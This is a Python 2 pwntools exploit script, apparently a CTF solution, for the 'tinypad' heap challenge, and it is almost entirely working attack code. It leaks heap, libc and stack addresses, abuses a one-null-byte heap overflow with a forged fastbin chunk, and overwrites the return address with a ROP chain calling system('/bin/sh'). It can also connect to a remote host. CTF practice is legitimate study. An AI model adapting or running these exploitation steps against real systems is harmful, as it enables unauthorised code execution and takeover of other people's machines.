#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1

# modify this
elf = ELF('./tinypad')

if DEBUG:
    io = process('./tinypad')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def add_pad(size, content):
	ru('>>>')
	sl('A')
	ru('>>>')
	sl(str(size))
	ru('>>>')
	sl(content)

def del_pad(idx):
	ru('>>>')
	sl('D')
	ru('>>>')
	sl(str(idx))

def edit_pad(idx, content):
	ru('>>>')
	sl('E')
	ru('>>>')
	sl(str(idx))
	ru('>>>')
	sl(content)
	ru('>>>')
	sl('Y')

# define exploit function here
def pwn():
	context.bits = 64
	add_pad(0x100, 'z' * 0x100)
	f = [
	cyclic(0x100 - 0x20),
	0, 
	0x50 | 0b001,
	cyclic(0x10)
	]
	edit_pad(1, flat(f))
	del_pad(1)

	add_pad(0x80, 'A' * 0x80)
	add_pad(0x80, 'B' * 0x80)
	add_pad(0x80, 'C' * 0x80)
	add_pad(0x80, 'D' * 0x80)	

	del_pad(3)
	del_pad(1)
	
	ru('#   INDEX: 1\n # CONTENT: ')
	heap_addr = u64(ru('\n\n\n')[:-3].ljust(8, '\x00'))
	info('heap addr : ' + hex(heap_addr))
	ru('#   INDEX: 3\n # CONTENT: ')
	libc_addr = u64(ru('\n\n\n')[:-3].ljust(8, '\x00'))
	info('libc addr : ' + hex(libc_addr))
	libc_base = libc_addr - 3951704
	environ = libc_base + 0x3c7218
	magic = libc_base + 0x442b1	
	#cant use addr in binary because of the strcpy was cut off by \x00, so we use addr in libc
	pop_rdi = libc_base + 0x218a2
	system_addr = libc_base + 279504
	bin_sh_addr = libc_base + 1623005
	#clean heap
	del_pad(4)
	del_pad(2)
	
	#now we start to use the one null byte overflow	
	add_pad(0x88, 'A' * 0x88)
	add_pad(0x100, 'B' * 0x100)
	add_pad(0x80, 'C' * 0x80)
	del_pad(2)
	edit_pad(1, 'Q' * 0x88)
	
	add_pad(0x80, 'b1' * 0x40)
	add_pad(0x40, 'b2' * 0x20)

	#delete b1
	del_pad(2)
	#forget about the b2
	del_pad(3)
	#now delete b2
	del_pad(4)
	c = [
	0,
    0x50 | 0b001,
    0,
    cyclic(0x68),

	0,
	0x50 | 0b001,
	0x602120,    # The address of our fake fast chunk in tinypad
	cyclic(0x28),
	
	0,
	0x50 | 0b001,
	0,
	0,
	0
	]
	add_pad(len(flat(c)), flat(c))	
	add_pad(0x40, 'C' * 0x40)

	#now the address whill be 0x602130, because the 0x602120 is the head of the chunk
	add_pad(0x40, 'A' * 0x18 + p64(environ) + p64(0x88) + p64(0x602168) + p64(0x88) + p64(environ))
	
	#calculate the ret addr of the main func
	ru("#   INDEX: 1\n # CONTENT: ")
	stack_addr = u64(rn(6).ljust(8, '\x00'))
	info('stack_addr : ' + hex(stack_addr))
	edit_stack = stack_addr - 0x1e0 + 0xf0
	edit_pad(2, p64(edit_stack))
	edit_pad(3, p64(pop_rdi))
	edit_pad(2, p64(edit_stack + 8))
	edit_pad(3, p64(bin_sh_addr))
	edit_pad(2, p64(edit_stack + 16))
	edit_pad(3, p64(system_addr))
	
	io.interactive()

if __name__ == '__main__':
	pause()
	pwn()
